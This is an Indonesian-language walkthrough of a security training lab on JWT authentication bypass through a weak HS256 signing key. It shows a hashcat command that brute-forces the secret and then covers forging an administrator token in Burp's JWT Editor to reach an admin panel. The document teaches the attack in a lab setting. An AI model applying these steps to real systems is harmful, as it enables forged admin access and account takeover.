# JWT Authentication Bypass via Weak Signing Key

## Konsep

### Apa itu Weak Signing Key?

JWT pakai:

```text
HS256
```

Artinya:

```text
1 secret dipakai untuk:
↓
Sign JWT
Verify JWT
```

Contoh:

```text
secret = secret123
```

Server:

```text
Sign(payload, secret)
Verify(jwt, secret)
```

---

### Kenapa bug bisa terjadi?

Bug:

```text
Secret terlalu lemah
↓
Bisa brute-force
↓
Attacker tahu secret
↓
Attacker bisa sign JWT palsu
```

Contoh:

```text
secret = secret1
```

Mudah ditebak.

---

# Langkah Exploit

## 1. Login

Login:

```text
wiener:peter
```

Ambil JWT:

```text
GET /my-account
```

Kirim:

```text
/admin
```

Respon:

```text
401 Unauthorized
```

Artinya:

```text
Admin hanya untuk administrator
```

---

## 2. Brute-force Secret

Ambil JWT:

Contoh:

```text
eyJhbGc...
```

Jalankan:

```bash
hashcat -a 0 -m 16500 <JWT> jwt.secrets.list
```

Output:

```text
secret1
```

Dapat:

```text
secret_server = secret1
```

---

## 3. Encode Secret

Burp:

```text
Decoder
↓
Base64 Encode
```

Encode:

```text
secret1
```

jadi:

```text
c2VjcmV0MQ==
```

---

## 4. Buat Symmetric Key

Burp:

```text
JWT Editor
↓
New Symmetric Key
↓
Generate
```

Ganti:

```json
"k":"generated"
```

jadi:

```json
"k":"c2VjcmV0MQ=="
```

(`k` = secret)

Save.

---

## 5. Edit Payload

Awal:

```json
{
 "sub":"wiener"
}
```

Ubah:

```json
{
 "sub":"administrator"
}
```

---

## 6. Sign JWT

Klik:

```text
Sign
↓
Pilih Symmetric Key
↓
OK
```

JWT sekarang:

```text
ditandatangani pakai:
secret1
```

---

## 7. Kirim Request

Kirim:

```text
GET /admin
```

Respon:

```text
200 OK
```

Admin panel terbuka.

---

## 8. Delete Carlos

Cari:

```text
/admin/delete?username=carlos
```

Kirim request.

Lab solved.

---

# Cara Server Memproses

Server:

```text
Terima JWT
↓
Verify pakai:
secret1
↓
Signature cocok
↓
sub=administrator
↓
Admin access
```

---

# Hafalan Cepat

```text
Ambil JWT
↓
Bruteforce secret
↓
Dapat secret
↓
Base64 encode
↓
Buat Symmetric Key
↓
sub=administrator
↓
Sign
↓
JWT valid
↓
Admin
```

---

# Inti Lab

> Weak Signing Key = secret JWT terlalu lemah sehingga attacker bisa brute-force lalu membuat JWT admin sendiri.
